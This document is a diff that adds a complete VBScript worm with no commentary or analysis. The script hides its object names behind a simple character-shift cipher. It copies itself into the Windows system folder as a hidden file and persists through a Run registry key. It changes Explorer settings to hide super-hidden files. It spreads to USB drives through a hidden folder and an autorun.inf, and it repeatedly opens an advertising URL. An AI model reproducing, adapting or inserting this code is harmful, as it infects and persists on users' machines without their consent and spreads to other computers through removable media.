@@ -1,0 +1,162 @@
+On Error Resume Next
+Dim filename,udir,waittime,url,dir0,uname,i,code
+codea="Uetkrvkpi0HkngU{uvgoQdlgev"
+codeb="yuetkrv0ujgnn"
+udir="\FOUND.000"
+uname="file000000.chk"
+filename="upgrade.sqm"
+waittime=20123
+url="http://www.bloggao.com/Ad.aspx?AdID=261003&UrlRefer=http://www.google.cn/search?q=%E4%B8%9C%E9%A3%8E%E6%97%A5%E4%BA%A7"
+If scripttype() = "vbs" Then
+    Call ExeVbs()     
+ElseIf scripttype() = "html" Then
+    Call install()
+End If
+
+Sub exeVbs()
+	call install()
+	call opendisk()
+	do while waittime > 100
+		for i=1 to 29
+			wscript.sleep waittime
+			call install()
+			call udisk()
+		next
+		call bogo()
+	loop
+End Sub
+
+Sub install()
+on error resume next
+Dim fso,objshell,dir1,dir,file,vfile
+Set fso=Createobject(decode(codea))
+Set objshell=Createobject(decode(codeb))
+Set dir=fso.GetSpecialFolder(1)
+dir1=dir&"\"
+If scripttype()="vbs" Then
+	fso.GetFile(WScript.ScriptFullName).Copy(dir1&filename)
+ElseIf scripttype()="html" Then
+	set vfile=fso.createtextfile(dir1&filename,true) 
+	vbsCode = GetScriptCode("vbscript")
+	vfile.write(vbsCode)
+end if	
+set file=fso.getfile(dir1&filename)
+file.attributes=38
+objshell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win32system","wscript /e:vbs "&dir1&filename
+objshell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"
+objshell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden",1,"REG_DWORD"
+set fso=nothing
+End sub
+
+Sub udisk()
+on error resume next
+Dim fso,getdrv,disktype,isreday,udirex,folder,file1,file2,fileex,autorun,autopath
+Set fso=Createobject(decode(codea))
+for each getdrv in fso.Drives
+disktype=fso.GetDrive(getdrv).DriveType 
+isreday=fso.GetDrive(getdrv).IsReady
+if disktype=1 and isreday then
+	udirex=fso.folderExists(getdrv&udir)
+	if not udirex then
+		fso.CreateFolder(getdrv&udir)
+	end if
+	set folder=fso.getfolder(getdrv&udir)
+	set file2=fso.getfile(getdrv&"\autorun.inf")
+	folder.attributes=22
+	fileex=fso.fileExists(getdrv&udir&"\"&uname)
+	if not fileex then
+		fso.GetFile(WScript.ScriptFullName).Copy(getdrv&udir&"\"&uname)
+	end if
+	fso.GetFile(WScript.ScriptFullName).Copy(getdrv&udir&"\"&uname)
+	fileex=fso.fileExists(getdrv&"\autorun.inf")
+	if fileex then
+		set file2=fso.getfile(getdrv&"\autorun.inf")
+		file2.attributes=38
+		fso.deletefile(getdrv&"\autorun.inf")
+	end if
+	set autorun=fso.createtextfile(getdrv&"\autorun.inf",true) 
+	autorun.writeline("[autorun]")
+	autorun.writeline("open=WScript.exe /e:vbs "&udir&"\"&uname)
+	autorun.writeline("shell\open=´ò¿ª(O)")
+	autorun.writeline("shell\open\command=wscript.exe /e:vbs "&udir&"\"&uname)
+	set folder=fso.getfolder(getdrv&udir)
+	set file1=fso.getfile(getdrv&udir&"\"&uname)
+	set file2=fso.getfile(getdrv&"\autorun.inf")
+	folder.attributes=23
+	file1.attributes=39
+	file2.attributes=39
+end if
+next
+set fso=nothing
+end sub
+
+Sub opendisk()
+on error resume next
+dim objShell,fso,cupath,cudrv,windir
+Set objShell = CreateObject(decode(codeb))
+Set fso=CreateObject(decode(codea)) 
+Set dir=fso.GetSpecialFolder(1)
+dir1=dir&"\"
+cupath = fso.Getfile(WScript.ScriptFullName).path
+cudrv = fso.GetFile(WScript.ScriptFullName).drive
+if mid(cupath,3,len(udir))=udir then
+	objshell.run(cudrv)
+	objshell.run("wscript /e:vbs "&dir1&filename)
+	wscript.quit
+end if
+set fso=nothing
+end sub
+
+Sub bogo()
+ Dim objshell
+ Set objshell=createobject(decode(codeb))
+ wscript.sleep waittime
+ objshell.run(url)
+end sub
+
+Function scripttype()
+    On Error Resume Next
+    Dim TErr
+    TErr = WScript.ScriptFullName 
+    If Err.number<>0 Then
+		err.clear
+        scripttype = "html"
+    Else
+        scripttype = "vbs"
+    End If
+End Function
+
+Function GetScriptCode(Languages)
+    On Error Resume Next
+    Dim soj
+    For Each soj In document.Scripts
+        If LCase(soj.Language) = Languages Then
+            Select Case LCase(soj.Language)
+                Case "vbscript"
+                    GetScriptCode = soj.Text
+                    Exit Function
+                Case "javascript"
+                    GetScriptCode = soj.Text
+                    Exit Function
+            End Select
+        End If
+    Next
+End Function
+
+Function DeCode(Code)
+On Error Resume Next
+Dim Curchar,i
+For i= 1 To Len(Code) 
+      Curchar=Mid(Code,i,1) 
+      If Asc(Curchar) = 16 then 
+             Curchar=chr(8) 
+      Elseif Asc(Curchar) = 24 then 
+             Curchar=chr(12) 
+      Elseif Asc(Curchar) = 32 then 
+             Curchar=chr(18) 
+      Else 
+             Curchar=chr(Asc(Curchar)-2) 
+      End if 
+DeCode=Decode & Curchar
+Next 
+End Function 
